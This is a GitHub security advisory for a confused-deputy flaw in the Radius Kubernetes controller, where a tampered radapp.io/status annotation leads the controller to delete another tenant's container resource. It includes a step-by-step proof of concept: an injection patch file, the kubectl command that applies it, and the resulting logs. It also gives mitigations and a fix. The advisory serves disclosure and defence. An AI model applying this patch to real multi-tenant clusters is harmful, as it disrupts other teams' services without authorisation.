# [H] Radius Controller May Delete a Container Resource via an Injected Deployment Annotation (Multi-Tenant Installs)

## Summary
Severity: High
Advisory: GHSA-fp5j-4fj2-4jvq
CVE: CVE-2026-53999
CWE: CWE-20, CWE-441
Ecosystem: Go
CVSS: CVSS:3.1/AV:N/AC:L/PR:L/UI:N/S:C/C:N/I:N/A:H (CVSS_V3)
Published: 2026-06-12
Source: https://github.com/advisories/GHSA-fp5j-4fj2-4jvq
Type: github-advisory

## Affected
- Go: `github.com/radius-project/radius` — affected >=0 <0.58.0

## Details
# Radius Controller May Delete a Container Resource via an Injected Deployment Annotation (Multi-Tenant Installs)

## Summary

A configuration-validation issue in the Radius Kubernetes controller can cause it to issue a `DELETE` for the container resource referenced by a tampered `radapp.io/status` annotation on a Deployment. It follows the "Confused Deputy" pattern. Real-world impact is bounded and depends heavily on install topology: in a multi-tenant install (one controller reconciling Deployments across resource groups owned by different teams) it can affect another team's container, while in a single-tenant install it is only self-DoS. There is no data disclosure, no privilege escalation, and no persistence, and deleted resources are recoverable through standard Radius deployment workflows.

- **Vulnerability Type**: Configuration Injection / Cross-Tenant Resource Deletion
- **CVSS 3.1 Score**: 7.7 (High in worst-case multi-tenant installs; Medium or lower in single-tenant or strict-RBAC installs)
- **CWE Classification**: CWE-20 (Improper Input Validation), CWE-441 (Unintended Proxy or Intermediary)
- **Affected Versions**: Radius v0.57.1 and earlier versions

## Vulnerability Details

### Root Cause

The Radius controller deserializes user-controllable JSON data from the `radapp.io/status` annotation on Kubernetes Deployments without validating whether the resource IDs belong to the current tenant. When the controller performs delete operations, it uses its own high-privilege credentials to send requests to the Radius API, enabling deletion of resources belonging to any tenant.

### Vulnerable Code Locations

**Vulnerability Source** - `pkg/controller/reconciler/annotations.go:110-119`:

```go
s := deploymentStatus{}
status := deployment.Annotations[AnnotationRadiusStatus]
if status != "" {
    err := json.Unmarshal([]byte(status), &s)  // Deserializes user-controllable data without validation
    if err != nil {
        return result, fmt.Errorf("failed to unmarshal status annotation: %w", err)
    }
    result.Status = &s
}
```

**Vulnerability Sink** - `pkg/controller/reconciler/deployment_reconciler.go:491`:

```go
poller, err := deleteContainer(ctx, r.Radius, annotations.Status.Container)  // Directly uses user-controllable data for deletion
```

### Attack Chain

```text
┌─────────────────────────────────────────────────────────────────────────────┐
│                           Confused Deputy Attack                            │
├─────────────────────────────────────────────────────────────────────────────┤
│                                                                             │
│  Tenant-A (Attacker)                    Tenant-B (Victim)                   │
│  ┌──────────────────┐                   ┌──────────────────┐                │
│  │ legitimate-app   │                   │ victim-container │                │
│  │ (Deployment)     │                   │ (Radius Resource)│                │
│  └────────┬─────────┘                   └────────▲─────────┘                │
│           │                                      │                          │
│           │ 1. Inject malicious                  │ 4. DELETE request        │
│           │    radapp.io/status                  │    (no auth check!)      │
│           │    annotation                        │                          │
│           ▼                                      │                          │
│  ┌──────────────────┐                    ┌───────┴──────────┐               │
│  │ Radius Controller│ ─────────────────▶│   Radius API      │               │
│  │ (High Privilege) │  3. Uses injected  │   (UCP)          │               │
│  └──────────────────┘     container ID   └──────────────────┘               │
│           ▲                                                                 │
│           │ 2. Reads annotation                                             │
│           │    without validation                                           │
│           │                                                                 │
└───────────┴─────────────────────────────────────────────────────────────────┘
```

## Proof of Concept (PoC)

### Prerequisites

- Kubernetes cluster with Radius v0.54.0 installed
- Attacker has permission to modify Deployment annotations in a namespace
- Target tenant has Radius-managed container resources

### Environment Setup

#### Step 1: Install Kind Cluster and Radius

```bash
# Create Kind cluster
kind create cluster --name radius-test --image kindest/node:v1.27.3

# Install Radius
rad install kubernetes --set global.zipkin.url=http://jaeger-collector.radius-system.svc.cluster.local:9411/api/v2/spans

# Verify installation
kubectl get pods -n radius-system
```

Expected output:

```text
NAME                            READY   STATUS    RESTARTS   AGE
applications-rp-xxx             1/1     Running   0          2m
bicep-de-xxx                    1/1     Running   0          2m
controller-xxx                  1/1     Running   0          2m
ucp-xxx                         1/1     Running   0          2m
```

#### Step 2: Create Attacker Tenant (tenant-a)

```bash
# Create resource group
rad group create tenant-a

# Create environment
rad env create tenant-a-env --group tenant-a

# Switch to tenant-a
rad group switch tenant-a
rad env switch tenant-a-env
```

#### Step 3: Deploy Legitimate Application in tenant-a

Create `legitimate-app.bicep`:

```bicep
extension radius

@description('The Radius application resource')
resource app 'Applications.Core/applications@2023-10-01-preview' = {
  name: 'legitimate-app'
  properties: {
    environment: environment()
  }
}

@description('The container resource')
resource container 'Applications.Core/containers@2023-10-01-preview' = {
  name: 'legitimate-container'
  properties: {
    application: app.id
    container: {
      image: 'nginx:latest'
    }
  }
}
```

Deploy the application:

```bash
rad deploy legitimate-app.bicep
```

#### Step 4: Create Victim Tenant (tenant-b)

```bash
# Create resource group and environment
rad group create tenant-b
rad env create tenant-b-env --group tenant-b

# Create victim application and container via UCP API
kubectl port-forward svc/ucp -n radius-system 8443:443 &
PF_PID=$!
sleep 3

# Create application
curl -k -X PUT "https://localhost:8443/apis/api.ucp.dev/v1alpha3/planes/radius/local/resourceGroups/tenant-b/providers/Applications.Core/applications/victim-app?api-version=2023-10-01-preview" \
  -H "Content-Type: application/json" \
  -d '{
    "location": "global",
    "properties": {
      "environment": "/planes/radius/local/resourceGroups/tenant-b/providers/Applications.Core/environments/tenant-b-env"
    }
  }'

# Create container
curl -k -X PUT "https://localhost:8443/apis/api.ucp.dev/v1alpha3/planes/radius/local/resourceGroups/tenant-b/providers/Applications.Core/containers/victim-container?api-version=2023-10-01-preview" \
  -H "Content-Type: application/json" \
  -d '{
    "location": "global",
    "properties": {
      "application": "/planes/radius/local/resourceGroups/tenant-b/providers/Applications.Core/applications/victim-app",
      "container": {
        "image": "nginx:latest"
      }
    }
  }'

kill $PF_PID 2>/dev/null || true
```

#### Step 5: Verify Victim Resource Exists

```bash
kubectl get deployment -n tenant-b-victim-app victim-container
```

Expected output:

```text
NAME               READY   UP-TO-DATE   AVAILABLE   AGE
victim-container   1/1     1            1           50s
```

### Exploitation

#### Step 6: Inject Malicious Annotation

Create `attack-patch.yaml`:

```yaml
metadata:
  annotations:
    radapp.io/enabled: "false"
    radapp.io/status: '{"container":"/planes/radius/local/resourceGroups/tenant-b/providers/Applications.Core/containers/victim-container","scope":"/planes/radius/local/resourceGroups/tenant-b"}'
```

Execute the attack:

```bash
kubectl patch deployment legitimate-app -n tenant-a --patch-file attack-patch.yaml
```

Expected output:

```text
deployment.apps/legitimate-app patched
```

#### Step 7: Verify Attack Success

Wait a few seconds and check the victim's resources:

```bash
kubectl get all -n tenant-b-victim-app
```

Expected output:

```text
No resources found in tenant-b-victim-app namespace.
```

### Log Evidence

The controller logs show the cross-tenant deletion operation:

**Attack Triggered** (15:29:41.351Z):

```json
{
  "timestamp": "2026-02-01T15:29:41.351Z",
  "message": "Starting DELETE operation.",
  "Deployment": {"name": "legitimate-app", "namespace": "tenant-a"}
}
```

**Cross-Tenant Delete Request** (15:29:41.351Z):

```json
{
  "timestamp": "2026-02-01T15:29:41.351Z",
  "message": "Deleting container.",
  "scope": "/planes/radius/local/resourceGroups/tenant-b",
  "resourceType": "Applications.Core/containers"
}
```

**Deletion Successful** (15:29:41.367Z):

```json
{
  "timestamp": "2026-02-01T15:29:41.367Z",
  "message": "Resource is deleted.",
  "Deployment": {"name": "legitimate-app", "namespace": "tenant-a"}
}
```

## Impact

### Security Impact

- **Confidentiality**: No direct impact (no data disclosure)
- **Integrity**: None - No victim data is modified; the issue deletes a Radius-managed container resource, which is recoverable from IaC
- **Availability**: High - Can cause service disruption for target tenants

### Attack Prerequisites

1. Attacker needs permission to modify Deployment annotations in a Kubernetes namespace
2. Attacker needs to know the target resource's Radius resource ID (obtainable through enumeration or social engineering)

### CVSS 3.1 Vector

```text
CVSS:3.1/AV:N/AC:L/PR:L/UI:N/S:C/C:N/I:N/A:H
```

| Metric              | Value   | Description                                                        |
|---------------------|---------|--------------------------------------------------------------------|
| Attack Vector       | Network | Via Kubernetes API                                                 |
| Attack Complexity   | Low     | Only requires annotation modification                              |
| Privileges Required | Low     | Requires Deployment edit permission                                |
| User Interaction    | None    | No user interaction required                                       |
| Scope               | Changed | Affects other tenants                                              |
| Confidentiality     | None    | No data disclosure                                                 |
| Integrity           | None    | No victim data modified; deletes a recoverable management resource |
| Availability        | High    | Causes service disruption                                          |

## Workarounds

Until an official fix is released, consider the following mitigations:

1. **Restrict Annotation Modification Permissions**: Use Kubernetes RBAC to limit who can modify Deployment annotations
2. **Monitor Anomalous Operations**: Monitor modifications to `radapp.io/status` annotations, especially those containing other tenants' resource IDs
3. **Network Isolation**: Implement strict network policies in multi-tenant environments

## Remediation Recommendations

### Short-term Fix

Add validation logic in `annotations.go` to ensure the container ID in `radapp.io/status` belongs to the current namespace/tenant:

```go
func validateContainerScope(deployment *appsv1.Deployment, containerID string) error {
    expectedScope := extractScopeFromDeployment(deployment)
    actualScope := extractScopeFromContainerID(containerID)
    if expectedScope != actualScope {
        return fmt.Errorf("container scope mismatch: expected %s, got %s", expectedScope, actualScope)
    }
    return nil
}
```

### Long-term Fix

1. **Implement Least Privilege Principle**: The controller should use credentials associated with the Deployment's tenant
2. **Add Radius API Authorization Validation**: UCP should validate the source tenant of delete requests
3. **Audit Logging**: Log all cross-tenant operation attempts

## References

- [Radius Project GitHub](https://github.com/radius-project/radius)
- [CWE-20: Improper Input Validation](https://cwe.mitre.org/data/definitions/20.html)
- [CWE-441: Unintended Proxy or Intermediary (Confused Deputy)](https://cwe.mitre.org/data/definitions/441.html)
- [OWASP: Confused Deputy Problem](https://owasp.org/www-community/attacks/Confused_Deputy)

## References
- https://github.com/radius-project/radius/security/advisories/GHSA-fp5j-4fj2-4jvq
- https://github.com/radius-project/radius
- https://github.com/radius-project/radius/releases/tag/v0.58.0
